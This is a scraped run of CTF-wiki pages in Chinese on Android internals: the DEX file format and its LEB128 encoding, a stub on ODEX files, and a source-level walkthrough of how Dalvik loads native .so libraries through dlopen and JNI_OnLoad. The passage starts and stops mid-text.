//符号扩展\n            } else {\n                cur = *(ptr++);\n                result |= (cur & 0x7f) << 21;\n                if (cur <= 0x7f) {\n                    result = (result << 4) >> 4;  //符号扩展\n                } else {\n                    /*\n                     * Note: We don't check to see if cur is out of\n                     * range here, meaning we tolerate garbage in the\n                     * high four-order bits.\n                     */\n                    cur = *(ptr++);\n                    result |= cur << 28;\n                }\n            }\n        }\n    }\n    *pStream = ptr;\n    return result;\n}\n```\n\n举个例子，假如我们要计算d1 c2 b3 40的sleb128值，计算过程如下\n\n- result1 = 0xd1 & 0x7f = 0x51\n- result2 = (0xc2 & 0x7f) <<7  = 0x21000\n- result3 = (0xb3 & 0x7f) <<14  =0xcc000\n- result4 = (0x40)<< 21 = 0x8000000\n- 最后结果(r1+r2+r3+r4)<< 4 >>4 = 0xf80ce151\n\n\nuleb128p1类型主要是用表示无符号数，其适用于以下场景\n\n- 要求数字的表示必须非负\n- 当数字为0xffffffff时，其加上1就为0，这时候我们就只需要1个字节即可。\n- **有待进一步思考。**\n\n### DEX 文件概览\n\nDEX文件的整体结构如下\n\n![](./figure/dex_structure.png)\n\n主要包括三个部分\n\n- 文件头，给出dex文件的基本属性。\n- 索引区，给出相关数据的索引，其数据其实放在数据区。\n- 数据区，存放真实的字符串，代码。\n\n### DEX 文件头\n\nDEX的文件头主要包含magic字段、alder32校验值、SHA-1哈希值、string_ids的个数以及偏移地址等，固定占用0x70个字节，数据结构如下\n\n```c++\nstruct DexHeader {\n    u1  magic[8];           /* includes version number */\n    u4  checksum;           /* adler32 checksum */\n    u1  signature[kSHA1DigestLen]; /* SHA-1 hash */\n    u4  fileSize;           /* length of entire file */\n    u4  headerSize;         /* offset to start of next section */\n    u4  endianTag;\n    u4  linkSize;\n    u4  linkOff;\n    u4  mapOff;\n    u4  stringIdsSize;\n    u4  stringIdsOff;\n    u4  typeIdsSize;\n    u4  typeIdsOff;\n    u4  protoIdsSize;\n    u4  protoIdsOff;\n    u4  fieldIdsSize;\n    u4  fieldIdsOff;\n    u4  methodIdsSize;\n    u4  methodIdsOff;\n    u4  classDefsSize;\n    u4  classDefsOff;\n    u4  dataSize;\n    u4  dataOff;\n};\n```\n\n其中具体的描述如下\n\n| 名称              | 格式                        | 说明                                       |\n| --------------- | ------------------------- | ---------------------------------------- |\n| magic           | ubyte[8] = DEX_FILE_MAGIC | 标识DEX文件，其中DEX_FILE_MAGIC =\"dex\\n035\\0\"   |\n| checksum        | uint                      | 除 `magic` 和此字段之外的文件剩下内容的 adler32 校验和，用于检测文件损坏情况 |\n| signature       | ubyte[20]                 | 除 `magic`、`checksum` 和此字段之外的文件的内容的 SHA-1 签名（哈希），用于对文件进行唯一标识 |\n| file_size       | uint                      | 整个文件（包括文件头）的大小，以字节为单位                    |\n| header_size     | uint = 0x70               | 文件头的大小，以字节为单位。                           |\n| endian_tag      | uint = ENDIAN_CONSTANT    | 字节序标记，大端序或者小端序。                          |\n| link_size       | uint                      | 如果此文件未进行静态链接，则该值为 `0`，反之为链接区段的大小，        |\n| link_off        | uint                      | 如果 `link_size == 0`，则该值为 `0`； 反之，该偏移量是文件开头到到 `link_data` 区段的偏移量。 |\n| map_off         | uint                      | 该偏移量必须非零，标识从文件开头到 `data` 区段的偏移量。         |\n| string_ids_size | uint                      | 字符串标识符列表中的字符串数量                          |\n| string_ids_off  | uint                      | 如果 `string_ids_size == 0`（不可否认是一种奇怪的极端情况），则该值为 `0`； 反之表示从文件开头到`string_ids`的偏移量。 |\n| type_ids_size   | uint                      | 类型标识符列表中的元素数量，最大为 65535                  |\n| type_ids_off    | uint                      | 如果 `type_ids_size == 0`（不可否认是一种奇怪的极端情况），则该值为 `0`； 反之表示从文件开头到 `type_ids` 区段开头的偏移量。 |\n| proto_ids_size  | uint                      | 原型（方法）标识符列表中的元素数量，最多为 65535              |\n| proto_ids_off   | uint                      | 如果 `proto_ids_size == 0`（不可否认是一种奇怪的极端情况），则该值为 `0`； 反之该偏移量表示文件开头到 `proto_ids` 区段开头的偏移量。 |\n| field_ids_size  | uint                      | 字段标识符列表中的元素数量                            |\n| field_ids_off   | uint                      | 如果 `field_ids_size == 0`，则该值为 `0`； 反之该偏移量表示文件开头到 `field_ids` 区段开头的偏移量。 |\n| method_ids_size | uint                      | 方法标识符列表中的元素数量                            |\n| method_ids_off  | uint                      | 如果 `method_ids_size == 0`，则该值为 `0`。反之该偏移量表示从文件开头到 `method_ids` 区段开头的偏移量。 |\n| class_defs_size | uint                      | 类定义列表中的元素数量                              |\n| class_defs_off  | uint                      | 如果 `class_defs_size == 0`（不可否认是一种奇怪的极端情况），则该值为 `0` ；反之该偏移量表示文件开头到 `class_defs` 区段开头的偏移量。 |\n| data_size       | uint                      | `data` 区段的以字节为单位的大小，必须是 sizeof(uint) 的偶数倍，说明8字节对齐。 |\n| data_off        | uint                      | 从文件开头到 `data` 区段开头的偏移量。                  |\n\n### DEX 索引区\n\n#### string id\n\nStringIds 区段包含`stringIdsSize`个`DexStringId`结构，其结构如下：\n\n```c++\nstruct DexStringId {\n    u4 stringDataOff;   /* 字符串数据偏移，也就是数据区中各个 StringData 的文件偏移*/\n};\n```\n\n可以看出DexStringId中存储的只是每一个字符串的相对偏移。此外，每一个偏移占据4个字节，字符串部分一共会占据4*stringIdsSize个字节。\n\n在对应的偏移处，字符串是使用MUTF-8格式存储的，其开头存储了之前我们所说的LEB128类型的变量，表示字符串的长度，之后紧跟着的就是字符串，之后以\\x00结尾，字符串的长度不包含\\x00。\n\n#### type id\n\ntype_ids 区索引了java代码中使用的所有类型（类、数组或基本类型），此列表必须按 `string_id` 索引进行排序，并且不能重复。\n\n```c++\nstruct DexTypeId {\n    u4 descriptorIdx;    /* 指向 DexStringId列表的索引 */\n};\n```\n\n#### proto Id\n\nProto id字段主要是针对于 java 中的方法原型而设计的，这里面主要包含了一个方法声明的返回类型与参数列表，对于方法名尚未涉及。其主要包含以下三个数据结构\n\n```c++\nstruct DexProtoId {\n    u4 shortyIdx;       /* 返回类型+参数类型，简写，指向DexStringId列表的索引 */\n    u4 returnTypeIdx;   /* 返回类型，指向DexTypeId列表的索引 */\n    u4 parametersOff;   /* 参数类型，指向DexTypeList的偏移 */\n}\n\nstruct DexTypeList {\n    u4 size;             /* DexTypeItem的个数，即参数个数 */\n    DexTypeItem list[1]; /* 指向DexTypeItem开始处 */\n};\n\nstruct DexTypeItem {\n    u2 typeIdx;           /* 参数类型，指向DexTypeId列表的索引，最终指向字符串索引 */\n};\n```\n\n#### field id\n\nfield id区主要是针对于java中每个类的字段而设计的，主要涉及到以下数据结构\n\n```c++\nstruct DexFieldId {\n    u2 classIdx;   /* 类的类型，指向DexTypeId列表的索引 */\n    u2 typeIdx;    /* 字段类型，指向DexTypeId列表的索引 */\n    u4 nameIdx;    /* 字段名，指向DexStringId列表的索引 */\n};\n```\n\n#### method id\n\nmethod id区是直接为 java 中的方法而设计的，其包含了方法所在的类，方法的原型，方法的名字。\n\n```c++\nstruct DexMethodId {\n    u2 classIdx;  /* 类的类型，指向DexTypeId列表的索引 */\n    u2 protoIdx;  /* 声明类型，指向DexProtoId列表的索引 */\n    u4 nameIdx;   /* 方法名，  指向DexStringId列表的索引 */\n};\n```\n\n\n\n#### class def\n\nclassDefsSize表明 class def 区域的大小，classDefsOff表明class def 区的偏移。\n\n该区是为 java 中的类而设计的，包含以下的数据结构，相关信息如下\n\n```c++\n// 类的基本信息\nstruct DexClassDef {\n    u4 classIdx;    /* 类的类型，指向DexTypeId列表的索引 */\n    u4 accessFlags; /* 访问标志 */\n    u4 superclassIdx;  /* 父类类型，指向DexTypeId列表的索引 */\n    u4 interfacesOff; /* 接口，指向DexTypeList的偏移 */\n    u4 sourceFileIdx; /* 源文件名，指向DexStringId列表的索引 */\n    u4 annotationsOff; /* 注解，指向DexAnnotationsDirectoryItem结构 */\n    u4 classDataOff;   /* 指向DexClassData结构的偏移 */\n    u4 staticValuesOff;  /* 指向DexEncodedArray结构的偏移 */\n};\n\n// 类的字段与方法概况\nstruct DexClassData {\n    DexClassDataHeader header; /* 指定字段与方法的个数 */\n    DexField* staticFields;    /* 静态字段，DexField结构 */\n    DexField* instanceFields;  /* 实例字段，DexField结构 */\n    DexMethod* directMethods;  /* 直接方法，DexMethod结构 */\n    DexMethod* virtualMethods; /* 虚方法，DexMethod结构 */\n\n// 详细描述类的字段个数与方法个数\nstruct DexClassDataHeader {\n    u4 staticFieldsSize;  /* 静态字段个数 */\n    u4 instanceFieldsSize; /* 实例字段个数 */\n    u4 directMethodsSize;  /* 直接方法个数 */\n    u4 virtualMethodsSize; /* 虚方法个数 */\n};\n\n// 字段定义\nstruct DexField {\n    u4 fieldIdx;    /* 指向DexFieldId的索引 */\n    u4 accessFlags; /* 访问标志 */\n};\n\n// 方法定义\nstruct DexMethod {\n    u4 methodIdx;   /* 指向DexMethodId的索引 */\n    u4 accessFlags; /* 访问标志 */\n    u4 codeOff;     /* 指向DexCode结构的偏移 */\n};\n\n// 代码概况\nstruct DexCode {\n    u2 registersSize;   /* 使用的寄存器个数 */\n    u2 insSize;         /* 参数个数 */\n    u2 outsSize;        /* 调用其他方法时其它方法使用的寄存器个数，会在自己的调用栈申请，并压栈（猜测） */\n    u2 triesSize;       /* Try/Catch个数 */\n    u4 debugInfoOff;    /* 指向调试信息的偏移 */\n    u4 insnsSize;       /* 指令集个数，以2字节为单位 */\n    u2 insns[1];        /* 指令集 */\n};\n```\n\n#### 小结\n\n可以看出在索引区指向是比较复杂的，但同时也比较巧妙，这里给出Dalvik设计者在[Google Developer Day 2008 China](https://sites.google.com/site/developerdaychina/) 演讲中给出的例子。\n\n![](./figure/dex_structure_designer.png)\n\n### DEX 数据区\n\n这里存的就是之前所说的各种数据了。\n\n### DEX map section\n\nDexHeader中的mapOff字段给出了DexMapList结构在DEX文件中的偏移。当Dalvik虚拟机解析DEX文件后的内容后，会将内容映射到DexMapList数据结构，可以说该结构描述了对应的DEX文件的整体概况。其具体代码如下\n\n```c++\nstruct DexMapList {\n    u4 size;               /* DexMapItem的个数，方便解析 */\n    DexMapItem list[1];    /* 指向DexMapItem */\n};\n\nstruct DexMapItem {\n    u2 type;      /* kDexType开头的类型 */\n    u2 unused;    /* 未使用，用于字节对齐 */\n    u4 size;      /* 指定相应类型的个数 */\n    u4 offset;    /* 指定相应类型的数据的文件偏移 */\n};\n\n/* type字段为一个枚举常量，通过类型名称很容易判断它的具体类型。 */\n/* map item type codes */\nenum {\n    kDexTypeHeaderItem               = 0x0000,\n    kDexTypeStringIdItem             = 0x0001,\n    kDexTypeTypeIdItem               = 0x0002,\n    kDexTypeProtoIdItem              = 0x0003,\n    kDexTypeFieldIdItem              = 0x0004,\n    kDexTypeMethodIdItem             = 0x0005,\n    kDexTypeClassDefItem             = 0x0006,\n    kDexTypeMapList                  = 0x1000,\n    kDexTypeTypeList                 = 0x1001,\n    kDexTypeAnnotationSetRefList     = 0x1002,\n    kDexTypeAnnotationSetItem        = 0x1003,\n    kDexTypeClassDataItem            = 0x2000,\n    kDexTypeCodeItem                 = 0x2001,\n    kDexTypeStringDataItem           = 0x2002,\n    kDexTypeDebugInfoItem            = 0x2003,\n    kDexTypeAnnotationItem           = 0x2004,\n    kDexTypeEncodedArrayItem         = 0x2005,\n    kDexTypeAnnotationsDirectoryItem = 0x2006,\n};\n```\n\n## DEX实例\n\n具体的可以自己找一个 apk，然后拿 010editor 的模板解析一下就可以看到相应的结果了。\n\n## 参考阅读\n\n- Android 软件安全与逆向分析\n", "timestamp": "2025-10-21T22:02:37.018662"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_operating_mechanism/java_layer/dex/odex.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_operating_mechanism/java_layer/dex/odex.md", "content": "# ODEX文件\n\n## 基本介绍\n\n我们知道 Android 应用程序的 java 层的代码在 apk 文件的 class.dex 文件中。一般情况下，我们在每次启动程序时会从中获取到 dex 文件并进行解析，显然每次都这样做，效率会比较低下。Android 开发者提出了一种方式，即我们最初加载 dex 文件时，就对其进行优化，生成一个 ODEX 文件，存放在 /data/dalvik-cache 目录下。当以后再次运行这个程序时，我们只需要直接加载这个优化过的 ODEX 文件就行了，省去了每次都要优化的时间。对于 Android ROM 中系统自带的 app ，直接转换为 odex 文件，存放在与 apk 相同的目录下，这样，当手机每次开机启动的时候，就会快很多了。\n\n## 基本结构\n\n待补充。\n\n## 生成过程\n\n待补充。\n\n\n\n## 参考阅读\n\n- Android 软件安全与逆向分析\n", "timestamp": "2025-10-21T22:02:37.251667"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_operating_mechanism/native_layer/so.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_operating_mechanism/native_layer/so.md", "content": "# so 介绍\n\n## 基本介绍\n\n- 为什么会用到 Shared Object(SO)\n    - 开发效率\n    - 快速移植\n- so 的版本\n    - 根据 CPU 平台有所不一样\n\n## 加载方法\n\n- System.loadLibrary\n    - 如果加载的文件名是 xxx ，那么其实加载的是项目中 libs 目录下的 libxxx.so文件。\n- System.load \n    - 对应 lib 的绝对路径。\n\n主要使用第一种方式，第二种方式主要用于在插件中加载 so 文件。\n\n## loadLibrary 加载流程\n\n根据官方 API 介绍\n\n> The call `System.loadLibrary(name)` is effectively equivalent to the call\n>\n> > ```\n> >  Runtime.getRuntime().loadLibrary(name)\n> > ```\n\n可以看出该函数其实调用的是 Runtime.java（ `libcore/luni/src/main/java/java/lang/Runtime.java` ）中的函数 loadLibrary，继而会继续调用 loadLibrary 另一个重载函数，它包含两个参数\n\n- libame，我们传入的库名字\n- VMStack.getCallingClassLoader()，类加载器 ClassLoader，方便于去寻找相应的 library。\n\n```java\n    /**\n     * Loads and links the library with the specified name. The mapping of the\n     * specified library name to the full path for loading the library is\n     * implementation-dependent.\n     *\n     * @param libName\n     *            the name of the library to load.\n     * @throws UnsatisfiedLinkError\n     *             if the library can not be loaded.\n     */\n    public void loadLibrary(String libName) {\n        loadLibrary(libName, VMStack.getCallingClassLoader());\n    }\n    /*\n     * Searches for a library, then loads and links it without security checks.\n     */\n    void loadLibrary(String libraryName, ClassLoader loader) {\n        if (loader != null) {\n            String filename = loader.findLibrary(libraryName);\n            if (filename == null) {\n                throw new UnsatisfiedLinkError(\"Couldn't load \" + libraryName +\n                                               \" from loader \" + loader +\n                                               \": findLibrary returned null\");\n            }\n            String error = doLoad(filename, loader);\n            if (error != null) {\n                throw new UnsatisfiedLinkError(error);\n            }\n            return;\n        }\n        String filename = System.mapLibraryName(libraryName);\n        List<String> candidates = new ArrayList<String>();\n        String lastError = null;\n        for (String directory : mLibPaths) {\n            String candidate = directory + filename;\n            candidates.add(candidate);\n            if (IoUtils.canOpenReadOnly(candidate)) {\n                String error = doLoad(candidate, loader);\n                if (error == null) {\n                    return; // We successfully loaded the library. Job done.\n                }\n                lastError = error;\n            }\n        }\n        if (lastError != null) {\n            throw new UnsatisfiedLinkError(lastError);\n        }\n        throw new UnsatisfiedLinkError(\"Library \" + libraryName + \" not found; tried \" + candidates);\n    }\n```\n\n可以看出，程序主要的功能正如注释所说\n\n> Searches for a library, then loads and links it without security checks.\n\n而其中所采用的加载函数是 doLoad 函数。在这里，我们先不继续分析，我们来看看 load 函数如何。\n\n## load 加载流程\n\n根据官方 API 说明，如下\n\n> The call System.load(name) is effectively equivalent to the call:\n>\n>  ```java\n> Runtime.getRuntime().load(name)\n>  ```\n\n其同样也是调用 Runtime.java 中的函数，如下\n\n```java\n    /**\n     * Loads and links the dynamic library that is identified through the\n     * specified path. This method is similar to {@link #loadLibrary(String)},\n     * but it accepts a full path specification whereas {@code loadLibrary} just\n     * accepts the name of the library to load.\n     *\n     * @param pathName\n     *            the absolute (platform dependent) path to the library to load.\n     * @throws UnsatisfiedLinkError\n     *             if the library can not be loaded.\n     */\n    public void load(String pathName) {\n        load(pathName, VMStack.getCallingClassLoader());\n    }\n    /*\n     * Loads and links the given library without security checks.\n     */\n    void load(String pathName, ClassLoader loader) {\n        if (pathName == null) {\n            throw new NullPointerException(\"pathName == null\");\n        }\n        String error = doLoad(pathName, loader);\n        if (error != null) {\n            throw new UnsatisfiedLinkError(error);\n        }\n    }\n```\n\n其同样也会调用load 的两个参数的重载函数，继而会调用doLoad函数。\n\n**无论是上面的哪一种加载方法，最后都会调用Runtime.java中的doLoad函数。**\n\n## 核心加载流程\n\n### doLoad\n\n下面我们来分析一下 doLoad 函数，如下\n\n```java\n    private String doLoad(String name, ClassLoader loader) {\n        // Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH,\n        // which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH.\n        // The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load\n        // libraries with no dependencies just fine, but an app that has multiple libraries that\n        // depend on each other needed to load them in most-dependent-first order.\n        // We added API to Android's dynamic linker so we can update the library path used for\n        // the currently-running process. We pull the desired path out of the ClassLoader here\n        // and pass it to nativeLoad so that it can call the private dynamic linker API.\n        // We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the\n        // beginning because multiple apks can run in the same process and third party code can\n        // use its own BaseDexClassLoader.\n        // We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any\n        // dlopen(3) calls made from a .so's JNI_OnLoad to work too.\n        // So, find out what the native library search path is for the ClassLoader in question...\n        String ldLibraryPath = null;\n        if (loader != null && loader instanceof BaseDexClassLoader) {\n            ldLibraryPath = ((BaseDexClassLoader) loader).getLdLibraryPath();\n        }\n        // nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless\n        // of how many ClassLoaders are in the system, but dalvik doesn't support synchronized\n        // internal natives.\n        synchronized (this) {\n            return nativeLoad(name, loader, ldLibraryPath);\n        }\n    }\n```\n\n虽然源代码很长，但是很多部分都是注释，也说明了为什么要使用这样的一个函数的原因，主要有以下原因\n\n- Android App 都是由 zygote fork 生成的，因此他们的 LD_LIBRARY_PATH 就是 zygote 的LD_LIBRARY_PATH，这也说明 apk 中的 so 文件不在这个路径下。\n- so 文件之间可能存在相互依赖，我们需要按照其按依赖关系的逆方向进行加载。\n\n函数的基本思想就是找到库文件的路径，然后使用 synchronized 方式调用了 nativeLoad 函数。\n\n### nativeload\n\n而 nativeload 函数其实就是一个原生层的函数\n\n```java\n    // TODO: should be synchronized, but dalvik doesn't support synchronized internal natives.\n    private static native String nativeLoad(String filename, ClassLoader loader,\n            String ldLibraryPath);\n```\n\n相应的文件路径为 `dalvik/vm/native/java_lang_Runtime.cpp` ，具体的 nativeLoad 函数如下\n\n```C\nconst DalvikNativeMethod dvm_java_lang_Runtime[] = {\n    { \"freeMemory\",          \"()J\",\n        Dalvik_java_lang_Runtime_freeMemory },\n    { \"gc\",                 \"()V\",\n        Dalvik_java_lang_Runtime_gc },\n    { \"maxMemory\",          \"()J\",\n        Dalvik_java_lang_Runtime_maxMemory },\n    { \"nativeExit\",         \"(I)V\",\n        Dalvik_java_lang_Runtime_nativeExit },\n    { \"nativeLoad\",         \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\",\n        Dalvik_java_lang_Runtime_nativeLoad },\n    { \"totalMemory\",          \"()J\",\n        Dalvik_java_lang_Runtime_totalMemory },\n    { NULL, NULL, NULL },\n};\n```\n\n可以看出在 native 层对应的函数是 Dalvik_java_lang_Runtime_nativeLoad，如下\n\n```C++\n/*\n * static String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath)\n *\n * Load the specified full path as a dynamic library filled with\n * JNI-compatible methods. Returns null on success, or a failure\n * message on failure.\n */\nstatic void Dalvik_java_lang_Runtime_nativeLoad(const u4* args,\n    JValue* pResult)\n{\n    StringObject* fileNameObj = (StringObject*) args[0];\n    Object* classLoader = (Object*) args[1];\n    StringObject* ldLibraryPathObj = (StringObject*) args[2];\n\n    assert(fileNameObj != NULL);\n    char* fileName = dvmCreateCstrFromString(fileNameObj);\n\n    if (ldLibraryPathObj != NULL) {\n        char* ldLibraryPath = dvmCreateCstrFromString(ldLibraryPathObj);\n        void* sym = dlsym(RTLD_DEFAULT, \"android_update_LD_LIBRARY_PATH\");\n        if (sym != NULL) {\n            typedef void (*Fn)(const char*);\n            Fn android_update_LD_LIBRARY_PATH = reinterpret_cast<Fn>(sym);\n            (*android_update_LD_LIBRARY_PATH)(ldLibraryPath);\n        } else {\n            ALOGE(\"android_update_LD_LIBRARY_PATH not found; .so dependencies will not work!\");\n        }\n        free(ldLibraryPath);\n    }\n\n    StringObject* result = NULL;\n    char* reason = NULL;\n    bool success = dvmLoadNativeCode(fileName, classLoader, &reason);\n    if (!success) {\n        const char* msg = (reason != NULL) ? reason : \"unknown failure\";\n        result = dvmCreateStringFromCstr(msg);\n        dvmReleaseTrackedAlloc((Object*) result, NULL);\n    }\n\n    free(reason);\n    free(fileName);\n    RETURN_PTR(result);\n}\n```\n\n根据注释，我们可以确定关键的代码在\n\n```c++\n    bool success = dvmLoadNativeCode(fileName, classLoader, &reason);\n```\n\n这一行执行后会告诉我们加载对应的 so 是否成功。\n\n### dvmLoadNativeCode\n\n其基本的代码如下，我们可以根据注释来简单判断一下该函数的功能：\n\n-   程序根据指定的绝对路径加载相应的 native code，但是如果该 library 已经加载了，那么就不会再次进行加载。\n\n此外，正如 JNI 中所说，我们不能将一个库加载到多个 class loader 中，也就是说，一个 library 只会和一个 class loader 关联。\n\n函数的基本执行流程如下\n\n1. 利用 findSharedLibEntry 判断是否已经加载了这个库，以及如果已经加载的话，是不是采用的是同一个class loader。\n\n```c++\n/*\n * Load native code from the specified absolute pathname.  Per the spec,\n * if we've already loaded a library with the specified pathname, we\n * return without doing anything.\n *\n * TODO? for better results we should absolutify the pathname.  For fully\n * correct results we should stat to get the inode and compare that.  The\n * existing implementation is fine so long as everybody is using\n * System.loadLibrary.\n *\n * The library will be associated with the specified class loader.  The JNI\n * spec says we can't load the same library into more than one class loader.\n *\n * Returns \"true\" on success. On failure, sets *detail to a\n * human-readable description of the error or NULL if no detail is\n * available; ownership of the string is transferred to the caller.\n */\nbool dvmLoadNativeCode(const char* pathName, Object* classLoader,\n        char** detail)\n{\n    SharedLib* pEntry;\n    void* handle;\n    bool verbose;\n\n    /* reduce noise by not chattering about system libraries */\n    verbose = !!strncmp(pathName, \"/system\", sizeof(\"/system\")-1);\n    verbose = verbose && !!strncmp(pathName, \"/vendor\", sizeof(\"/vendor\")-1);\n\n    if (verbose)\n        ALOGD(\"Trying to load lib %s %p\", pathName, classLoader);\n\n    *detail = NULL;\n\n    /*\n     * See if we've already loaded it.  If we have, and the class loader\n     * matches, return successfully without doing anything.\n     */\n    pEntry = findSharedLibEntry(pathName);\n    if (pEntry != NULL) {\n        if (pEntry->classLoader != classLoader) {\n            ALOGW(\"Shared lib '%s' already opened by CL %p; can't open in %p\",\n                pathName, pEntry->classLoader, classLoader);\n            return false;\n        }\n        if (verbose) {\n            ALOGD(\"Shared lib '%s' already loaded in same CL %p\",\n                pathName, classLoader);\n        }\n        if (!checkOnLoadResult(pEntry))\n            return false;\n        return true;\n    }\n\n\n\n```\n\n2. 如果没有加载的话，就会利用 dlopen 打开该共享库。\n\n```c++\n    /*\n     * Open the shared library.  Because we're using a full path, the system\n     * doesn't have to search through LD_LIBRARY_PATH.  (It may do so to\n     * resolve this library's dependencies though.)\n     *\n     * Failures here are expected when java.library.path has several entries\n     * and we have to hunt for the lib.\n     *\n     * The current version of the dynamic linker prints detailed information\n     * about dlopen() failures.  Some things to check if the message is\n     * cryptic:\n     *   - make sure the library exists on the device\n     *   - verify that the right path is being opened (the debug log message\n     *     above can help with that)\n     *   - check to see if the library is valid (e.g. not zero bytes long)\n     *   - check config/prelink-linux-arm.map to ensure that the library\n     *     is listed and is not being overrun by the previous entry (if\n     *     loading suddenly stops working on a prelinked library, this is\n     *     a good one to check)\n     *   - write a trivial app that calls sleep() then dlopen(), attach\n     *     to it with \"strace -p <pid>\" while it sleeps, and watch for\n     *     attempts to open nonexistent dependent shared libs\n     *\n     * This can execute slowly for a large library on a busy system, so we\n     * want to switch from RUNNING to VMWAIT while it executes.  This allows\n     * the GC to ignore us.\n     */\n    Thread* self = dvmThreadSelf();\n    ThreadStatus oldStatus = dvmChangeStatus(self, THREAD_VMWAIT);\n    handle = dlopen(pathName, RTLD_LAZY);\n    dvmChangeStatus(self, oldStatus);\n\n    if (handle == NULL) {\n        *detail = strdup(dlerror());\n        ALOGE(\"dlopen(\\\"%s\\\") failed: %s\", pathName, *detail);\n        return false;\n    }\n\n```\n\n其中的 dlopen 函数(`bionic/linker/dlfcn.cpp`)如下\n\n```c++\nvoid* dlopen(const char* filename, int flags) {\n  ScopedPthreadMutexLocker locker(&gDlMutex);\n  soinfo* result = do_dlopen(filename, flags);\n  if (result == NULL) {\n    __bionic_format_dlerror(\"dlopen failed\", linker_get_error_buffer());\n    return NULL;\n  }\n  return result;\n}\n```\n\n其会调用 do_dlopen 函数(`bionic/linker/linker.cpp`)，如下\n\n```c++\nsoinfo* do_dlopen(const char* name, int flags) {\n  if ((flags & ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL)) != 0) {\n    DL_ERR(\"invalid flags to dlopen: %x\", flags);\n    return NULL;\n  }\n  set_soinfo_pool_protection(PROT_READ | PROT_WRITE);\n  soinfo* si = find_library(name);  //判断是否有这个库，有的话，需要完成初始化工作\n  if (si != NULL) {\n    si->CallConstructors();\n  }\n  set_soinfo_pool_protection(PROT_READ);\n  return si;\n}\n```\n\n在找到对应的库之后，会使用 `si->CallConstructors();`  来构造相关信息，如下\n\n```c++\nvoid soinfo::CallConstructors() {\n  if (constructors_called) {\n    return;\n  }\n\n  // We set constructors_called before actually calling the constructors, otherwise it doesn't\n  // protect against recursive constructor calls. One simple example of constructor recursion\n  // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so:\n  // 1. The program depends on libc, so libc's constructor is called here.\n  // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so.\n  // 3. dlopen() calls the constructors on the newly created\n  //    soinfo for libc_malloc_debug_leak.so.\n  // 4. The debug .so depends on libc, so CallConstructors is\n  //    called again with the libc soinfo. If it doesn't trigger the early-\n  //    out above, the libc constructor will be called again (recursively!).\n  constructors_called = true;\n\n  if ((flags & FLAG_EXE) == 0 && preinit_array != NULL) {\n    // The GNU dynamic linker silently ignores these, but we warn the developer.\n    PRINT(\"\\\"%s\\\": ignoring %d-entry DT_PREINIT_ARRAY in shared library!\",\n          name, preinit_array_count);\n  }\n\n  if (dynamic != NULL) {\n    for (Elf32_Dyn* d = dynamic; d->d_tag != DT_NULL; ++d) {\n      if (d->d_tag == DT_NEEDED) {\n        const char* library_name = strtab + d->d_un.d_val;\n        TRACE(\"\\\"%s\\\": calling constructors in DT_NEEDED \\\"%s\\\"\", name, library_name);\n        find_loaded_library(library_name)->CallConstructors();  //判断库是否已经加载\n      }\n    }\n  }\n\n  TRACE(\"\\\"%s\\\": calling constructors\", name);\n\n  // DT_INIT should be called before DT_INIT_ARRAY if both are present.\n  CallFunction(\"DT_INIT\", init_func);\n  CallArray(\"DT_INIT_ARRAY\", init_array, init_array_count, false);\n}\n```\n\n可以看出，正如注释所写的，如说 .init 函数与 init_array 存在的话，程序会依次调用 .init 函数与.init_array 中对应位置的代码。相关说明如下\n\n```c++\n#define DT_INIT\t\t12\t/* Address of initialization function */\n#define DT_INIT_ARRAY\t25\t/* Address of initialization function array */\n```\n\n3. 建立一个打开的共享库的 entry，并试图其加入到对应的 list 中，方便管理。如果加入失败的话，就会对其进行释放。\n\n```c++\n\n    /* create a new entry */\n    SharedLib* pNewEntry;\n    pNewEntry = (SharedLib*) calloc(1, sizeof(SharedLib));\n    pNewEntry->pathName = strdup(pathName);\n    pNewEntry->handle = handle;\n    pNewEntry->classLoader = classLoader;\n    dvmInitMutex(&pNewEntry->onLoadLock);\n    pthread_cond_init(&pNewEntry->onLoadCond, NULL);\n    pNewEntry->onLoadThreadId = self->threadId;\n\n    /* try to add it to the list */\n    SharedLib* pActualEntry = addSharedLibEntry(pNewEntry);\n\n    if (pNewEntry != pActualEntry) {\n        ALOGI(\"WOW: we lost a race to add a shared lib (%s CL=%p)\",\n            pathName, classLoader);\n        freeSharedLibEntry(pNewEntry);\n        return checkOnLoadResult(pActualEntry);\n    } \n```\n\n4. 如果加载成功，就会利用 dlsym 来获取对应 so 文件中的 JNI_OnLoad 函数，如果存在该函数的话，就进行调用，否则，就会直接返回。\n\n```c++\nelse {\n        if (verbose)\n            ALOGD(\"Added shared lib %s %p\", pathName, classLoader);\n\n        bool result = false;\n        void* vonLoad;\n        int version;\n\n        vonLoad = dlsym(handle, \"JNI_OnLoad\");\n        if (vonLoad == NULL) {\n            ALOGD(\"No JNI_OnLoad found in %s %p, skipping init\", pathName, classLoader);\n            result = true;\n        } else {\n            /*\n             * Call JNI_OnLoad.  We have to override the current class\n             * loader, which will always be \"null\" since the stuff at the\n             * top of the stack is around Runtime.loadLibrary().  (See\n             * the comments in the JNI FindClass function.)\n             */\n            OnLoadFunc func = (OnLoadFunc)vonLoad;\n            Object* prevOverride = self->classLoaderOverride;\n\n            self->classLoaderOverride = classLoader;\n            oldStatus = dvmChangeStatus(self, THREAD_NATIVE);\n            if (gDvm.verboseJni) {\n                ALOGI(\"[Calling JNI_OnLoad for \\\"%s\\\"]\", pathName);\n            }\n            version = (*func)(gDvmJni.jniVm, NULL);\n            dvmChangeStatus(self, oldStatus);\n            self->classLoaderOverride = prevOverride;\n\n            if (version == JNI_ERR) {\n                *detail = strdup(StringPrintf(\"JNI_ERR returned from 